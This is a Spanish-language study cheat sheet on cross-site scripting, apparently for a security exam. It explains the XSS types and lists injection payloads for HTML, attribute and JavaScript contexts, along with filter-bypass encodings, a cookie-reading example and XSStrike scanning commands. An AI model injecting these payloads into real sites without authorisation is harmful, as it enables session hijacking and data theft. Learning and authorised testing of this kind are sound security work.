
# 💡 Explicación

XSS es una vulnerabilidad de seguridad que permite a un atacante inyectar código malicioso(generalmente JavaScript) en una página web. Cuando la víctima accede a la página, el código se ejecuta en su navegador, permitiendo robar cookies, sesiones, datos personales o realizar acciones no autorizadas.

Podemos diferenciar 3 tipos de ataques XSS:

- **Reflected XSS**: El código malicioso se refleja directamente en la respuesta del servidor. El atacante envía una URL maliciosa a la víctima (no es persistente).

- **Stored XSS**: El código se almacena permanentemente en la base de datos (comentarios, mensajes, foros). Se ejecuta cada vez que otros usuarios acceden (persistente).

- **DOM-based XSS**: El código se inyecta modificando el Document Object Model del navegador, sin pasar por el servidor (ejecución en el Client-Site)

A continuación se muestra un ejemplo básico de un payload XSS:

```
<script>alert('XSS')</script>
```

### 1️⃣ **Contexto HTML** (Inyección de Etiquetas)

Si el servidor no filtra los corchetes angulares `< >`, estos son los mejores aliados.

|Objetivo|Payload|Notas|
|---|---|---|
|**Básico**|`<script>alert(1)</script>`|El primero que debes probar siempre.|
|**Bypass de `<script>`**|`<img src=x onerror=alert(1)>`|Clásico si la palabra "script" está en una lista negra.|
|**Sin interacción**|`<svg onload=alert(1)>`|Muy útil porque se ejecuta solo al cargar la imagen vectorial.|
|**HTML5**|`<details open ontoggle=alert(1)>`|Menos común, suele saltarse filtros antiguos.|



### 2️⃣ **Contexto de Atributo** (Rompiendo la etiqueta)

Es muy común que la entrada caiga dentro de un `value="..."` o un `title="..."`.

- Para "saltar" fuera del atributo:
```
"><script>alert(1)</script>
```

- Si los `< >` están filtrados (Uso de Eventos):
```
" onfocus="alert(1)" autofocus=" 
```
   _Este es el "payload estrella" del examen si detectas que puedes usar comillas dobles._

- Si estás en un `href` o `src`: 
```
javascript:alert(1)
```


### 3️⃣ **Contexto JavaScript** (Dentro de un bloque `<script>`)

A veces el reflejo ocurre dentro de una variable de JS:

- Terminar la línea y ejecutar: 
```
';alert(1)//
```

- Uso de operadores (si el punto y coma está filtrado): 
```
'-alert(1)-'
'+alert(1)+'
```

# 🎯 Finalidad del XSS

Si conseguimos un endpoint vulnerable a XSS, podemos extraer información del usuario como por ejemplo:

1. Cookies de sesión: 
```
<script>alert(document.cookie)</script>
```

2. Credenciales y datos sensibles en almacenamiento local:
```
window.localStorage
window.sessionStorage
```

etc...

# ✋🏻 Bypasses

Estos son algunos bypasses básicos que podemos realizar:

| **Técnica**               | **Payload / Ejemplo**                   |
| ------------------------- | --------------------------------------- |
| **Mayúsculas**            | `<SCRIPT>alert(1)</SCRIPT>`             |
| **Mixto (Case Swapping)** | `<ScRiPt>alert(1)</sCrIpT>`             |
| **URL Encoding**          | `%3Cscript%3Ealert(1)%3C/script%3E`     |
| **Hex Encoding**          | `\x3cscript\x3ealert(1)\x3c/script\x3e` |
| **SVG (Contexto XML)**    | `<svg><script>alert(1)</script></svg>`  |

# 🔧 Herramientas

La herramienta más conocida es **XSStrike**: https://github.com/s0md3v/XSStrike
### Modo de uso

##### 1. Escaneo básico de URL

- GET request: `
```
python xsstrike.py -u "http://example.com/search.php?q=query"
```
`

- POST request: 
```
python xsstrike.py -u "http://example.com/search.php" --data "q=query"
```


- POST con JSON: 
```
python xsstrike.py -u "http://example.com/api" --data '{"q":"query"}' --json
```

##### 2. Modo Crawling

- Crawling básico:
```
python xsstrike.py -u "http://example.com/" --crawl
```

- Con profundidad especificada (nivel 3)
```
python xsstrike.py -u "http://example.com/" --crawl -l 3
```

# 🔗 Referencias

Lista de payloads XSS: [https://github.com/payloadbox/xss-payload-list](https://github.com/payload-box/xss-payload-list)



Otras cosas: 
- Las cosas que pongan en `window.location.search` significa que las coge de la URL
